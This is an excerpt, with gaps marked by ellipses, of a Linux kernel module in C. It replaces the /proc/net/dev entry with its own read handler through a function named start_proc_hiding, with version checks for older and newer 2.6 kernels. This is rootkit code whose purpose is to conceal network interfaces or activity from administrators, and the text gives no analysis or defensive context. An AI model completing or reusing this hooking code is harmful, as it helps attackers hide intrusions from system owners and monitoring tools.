...
//Kernel 2.6.26 drops struct's proc_dir_entry get_info_t *get_info member so in it and newer kernels we use read_proc_t as a function type
#if ( LINUX_VERSION_CODE < KERNEL_VERSION(2,6,26) )
static int dev_get_info(char *buffer, char **start, off_t offset, int length)
#else 
static int dev_get_info(char *buffer, char **start, off_t offset, int length, int* eof, void* data) 
#endif 
{
        int len = 0;
        off_t begin = 0;
...
int start_proc_hiding(){
  ...
  for(proc_ptr = proc_net->subdir;proc_ptr !=0;proc_ptr = proc_ptr->next){
    if(proc_ptr->namelen == 3 && !memcmp("dev",proc_ptr->name,3)){
      old_read_proc = proc_ptr->get_info;
      lock_kernel();
      proc_net_remove("dev");
  ...
  for(proc_ptr = init_net.proc_net->subdir;proc_ptr !=0;proc_ptr = proc_ptr->next){
    if(proc_ptr->namelen == 3 && !memcmp("dev",proc_ptr->name,3)){
      old_read_proc = proc_ptr->read_proc;
      lock_kernel();
      proc_net_remove(&init_net,"dev");
      create_proc_read_entry("dev",0,init_net.proc_net,dev_get_info, NULL);
      unlock_kernel();
      return 1;
    }
  }
...
#if ( LINUX_VERSION_CODE < KERNEL_VERSION(2,6,24) )
  proc_net_remove("dev");
  proc_net_create("dev",0,old_read_proc);
#else
  proc_net_remove(&init_net,"dev");
